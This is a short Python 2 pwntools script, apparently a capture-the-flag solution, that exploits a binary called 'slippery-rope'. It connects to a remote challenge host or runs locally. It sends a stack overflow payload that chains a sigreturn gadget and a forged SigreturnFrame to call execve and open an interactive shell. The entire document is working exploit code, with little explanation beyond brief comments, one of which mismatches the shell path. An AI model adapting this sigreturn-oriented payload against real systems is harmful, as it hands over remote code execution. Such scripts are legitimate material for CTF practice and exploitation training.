#!/usr/bin/env python2

from pwn import *

exe = ELF("./slippery-rope")
context.binary = exe

pop_rax_ret = 0x4001b5
syscall_ret = 0x4001b1

def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("pwn.hfz-1337.ninja", 1337)


def main():
    r = conn()

    #fake frame to set the registers
    frame = SigreturnFrame()
    frame.rax = 59 # the execve syscall
    frame.rdi = 0x6001cc # the address of '/bin/sh\0'
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_ret

    payload = '/bin/bash\0'.ljust(208, 'a')
    payload += p64(pop_rax_ret)
    payload += p64(15) #the sigreturn syscall
    payload += p64(syscall_ret)
    payload += str(frame)

    r.recvuntil('> ')
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
